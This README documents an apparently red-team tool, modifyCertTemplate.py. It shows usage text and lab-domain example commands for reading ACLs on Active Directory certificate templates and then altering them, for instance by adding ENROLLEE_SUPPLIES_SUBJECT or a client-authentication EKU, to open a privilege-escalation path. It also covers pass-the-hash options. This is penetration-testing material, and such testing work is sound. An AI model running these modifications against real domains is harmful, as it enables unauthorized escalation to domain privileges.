# Purpose
This tool is designed to aid an operator in modifying ADCS certificate templates so that a created vulnerable state can be leveraged for privilege escalation (and then reset the template to its previous state afterwards). This is specifically designed for a scenario where `WriteProperty` rights over a template have been compromised, but the operator is unsure which properties the right applies to. In this scenairo, the template's ACL can be queried and the applicable ACE information can be cross-referenced with property GUIDs to determine the modifiable properties. 

# Usage
```
usage: modifyCertTemplate.py [-h] -template template name [-property property name] [-value new value] [-get-acl] [-dn distinguished name] [-raw] [-add flag name] [-debug]
                             [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-ldaps]
                             target

Modify the attributes of an Active Directory certificate template

positional arguments:
  target                [[domain/]username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -template template name
                        Name of the target certificate template
  -property property name
                        Name of the target template property
  -value new value      Value to set the specified template property to
  -get-acl              Print the certificate's ACEs
  -dn distinguished name
                        Explicitly set the distinguished name of the certificate template
  -raw                  Output the raw certificate template attributes
  -add flag name        Add a flag to an attribute, maintaining the existing flags
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will
                        use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -ldaps                Use LDAPS instead of LDAP
```
# Examples
### Querying a Template or Property Value
Query a certificate template (all attributes)
```
python3 modifyCertTemplate.py -template KerberosAuthentication ez.lab/administrator:pass
```

Query a single attribute from a certificate template
```
python3 modifyCertTemplate.py -template KerberosAuthentication -property msPKI-Certificate-Name-Flag ez.lab/administrator:pass
```

Query the raw values of all template attributes
```
python3 modifyCertTemplate.py -template KerberosAuthentication -raw ez.lab/administrator:pass
```

### Querying ACL Info
Query the ACL for a certificate template
```
python3 modifyCertTemplate.py -template KerberosAuthentication -get-acl ez.lab/administrator:pass
```
Although unrelated to certificate templates, any object's ACL can be queried by providing the object's distinguished name
```
python3 modifyCertTemplate.py -dn "CN=ws1,CN=computers,DC=ez,DC=lab" -get-acl ez.lab/administrator:pass
```

### Modifying a Template
Add the `ENROLLEE_SUPPLIES_SUBJECT` flag to the template's `msPKI-Certificate-Name-Flag` property
```
python3 modifyCertTemplate.py -template KerberosAuthentication -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag ez.lab/administrator:pass 
```

Update the value of a certificate template attribute (non-list properties)
```
python3 modifyCertTemplate.py -template KerberosAuthentication -property msPKI-Certificate-Name-Flag -value -150994944 ez.lab/administrator:pass
```

Add an EKU to the `pKIExtendedKeyUsage` property
```
python3 modifyCertTemplate.py -template KerberosAuthentication -add "client authentication" -property pKIExtendedKeyUsage ez.lab/administrator:pass 
```

Update the value of a list-formatted attribute (i.e. explicitly set the value of `pKIExtendedKeyUsage`)
```
python3 modifyCertTemplate.py -template KerberosAuthentication -value "'1.3.6.1.5.5.7.3.4', '1.3.6.1.5.5.7.3.2'" -property pKIExtendedKeyUsage ez.lab/administrator:pass 
```

# References, Credits and Other Projects to Check Out!
- [PyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [Certi](https://github.com/zer1t0/certi)
- [StandIn](https://github.com/FuzzySecurity/StandIn)
